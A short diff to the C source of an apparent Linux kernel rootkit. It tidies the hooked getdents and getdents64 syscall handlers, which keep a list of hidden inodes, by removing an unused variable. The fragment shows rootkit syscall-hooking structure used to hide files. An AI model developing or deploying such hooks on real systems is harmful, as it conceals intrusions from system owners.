@@ -13,6 +13,7 @@
 extern rootkit_t rootkit;
 
 void **sys_calls;
+
 atomic_t getdents_count;
 atomic_t getdents64_count;
 
@@ -82,7 +83,6 @@ g7_getdents(const struct pt_regs *pt_regs)
     unsigned long offset;
     dirent_t_ptr kdirent, cur_kdirent, prev_kdirent;
     struct dentry *kdirent_dentry;
-    struct inode *kdirent_inode;
 
     cur_kdirent = prev_kdirent = NULL;
     int fd = (int)pt_regs->di;
@@ -98,7 +98,6 @@ g7_getdents(const struct pt_regs *pt_regs)
     atomic_inc(&getdents_count);
 
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
-    kdirent_inode = kdirent_dentry->d_inode;
 
     inode_list_t hidden_inodes = { 0, NULL };
     inode_list_t_ptr hi_head, hi_tail;
@@ -148,7 +147,6 @@ g7_getdents64(const struct pt_regs *pt_regs)
     unsigned long offset;
     dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;
     struct dentry *kdirent_dentry;
-    struct inode *kdirent_inode;
 
     cur_kdirent = prev_kdirent = NULL;
     int fd = (int)pt_regs->di;
@@ -164,7 +162,6 @@ g7_getdents64(const struct pt_regs *pt_regs)
     atomic_inc(&getdents64_count);
 
     kdirent_dentry = current->files->fdt->fd[fd]->f_path.dentry;
-    kdirent_inode = kdirent_dentry->d_inode;
 
     inode_list_t hidden_inodes = { 0, NULL };
     inode_list_t_ptr hi_head, hi_tail;
